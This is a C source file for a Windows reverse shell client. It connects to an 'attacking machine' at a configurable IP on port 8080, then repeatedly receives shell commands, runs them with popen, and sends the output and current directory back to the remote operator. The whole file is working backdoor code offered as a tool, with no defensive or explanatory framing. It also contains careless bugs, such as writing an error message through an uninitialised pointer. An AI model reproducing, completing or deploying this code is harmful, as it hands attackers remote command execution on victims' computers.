#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <unistd.h>


void startWinsock();
SOCKET startSocket();
int connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void closeSocket(SOCKET client_socket);
void sendMsg(SOCKET client_socket, char *msg);
void receiveCommand(SOCKET client_socket, char *rsp);

int main(){
    
    char cmd_buff[1024];        // buffer that stores the command sent by the server
    char output_buff[1024];     // buffer that stores the output of the command
    char cwd[1024];             // buffer that stores the current working directory
    FILE *output;

    SOCKET client_socket;
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";    // Replace this with your attacking machine's IP address

    startWinsock();
    client_socket = startSocket();
    while (connectToServer(&serv_addr, client_socket, server_ip) != 1){
        printf("Waiting for connection...");
        Sleep(1000);
    }
    
    // get the current working directory and send it to the server
    getcwd(cwd, 1024);
    sendMsg(client_socket, cwd);

    while (1){
        
        memset(cmd_buff, 0, 1024);
        memset(output_buff, 0, 1024);
        receiveCommand(client_socket, cmd_buff);
        printf("%s\n", cmd_buff);
        char cmd_buff_copy[1024];
        strcpy(cmd_buff_copy, cmd_buff);
        char* cmd_arg1 = strtok(cmd_buff_copy, " ");

        if (strcmp(cmd_arg1, "cd") == 0){
            // code for if the command was cd
            // switch to the new working directory and send it to the server
            strcpy(cwd, &cmd_buff[3]);
            chdir(cwd);
            getcwd(cwd, 1024);
            strcat(output_buff, "\n");
            strcat(output_buff, "cURR_dIR");
            strcat(output_buff, cwd);

        } else {
            // code for any other command aside from cd
            output = popen(cmd_buff, "r"); 
            if (output != NULL){
                // read each line of output and send it to the server
                while(1){
                    char line[1024];
                    char* read = fgets(line, 1024, output); 
                    if (!read){
                        break;  // stop reading the output if there is no longer any output
                    }
                    sendMsg(client_socket, line);
                }
            } else {    // execute this code if an error happened when executing the command
                printf("Error executing command.\n");
                char* err_msg;
                sprintf(err_msg, "Error executing the command %s \n", cmd_buff);
                sendMsg(client_socket, err_msg);
            }
            
            getcwd(cwd, 1024);
            strcat(output_buff, "cURR_dIR"); 
            strcat(output_buff, cwd);
            // "cURR_dIR" is the string that separates our command's ouput from the current working directory
        }
        sendMsg(client_socket, output_buff);
        pclose(output);
    }
    return 1;
}

void startWinsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

SOCKET startSocket() {
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return client_socket;
}

int connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
    inet_pton(AF_INET, server_ip, &serv_addr->sin_addr);
    if (connect(client_socket, (struct sockaddr *)serv_addr, sizeof(*serv_addr)) < 0) {
        printf("\nConnection Failed. \n");
        return 0;
    } else{
        printf("Client connected to server.\n");
        return 1;
    }
}

void sendMsg(SOCKET client_socket, char *msg) {
    int sent = send(client_socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

void closeSocket(SOCKET client_socket) {
    closesocket(client_socket);
    WSACleanup();
}

void receiveCommand(SOCKET client_socket, char *rsp){
    int received = recv(client_socket, rsp, 1024, 0);
    if (received < 1){
        printf("Error receiving message.\n");
    }
}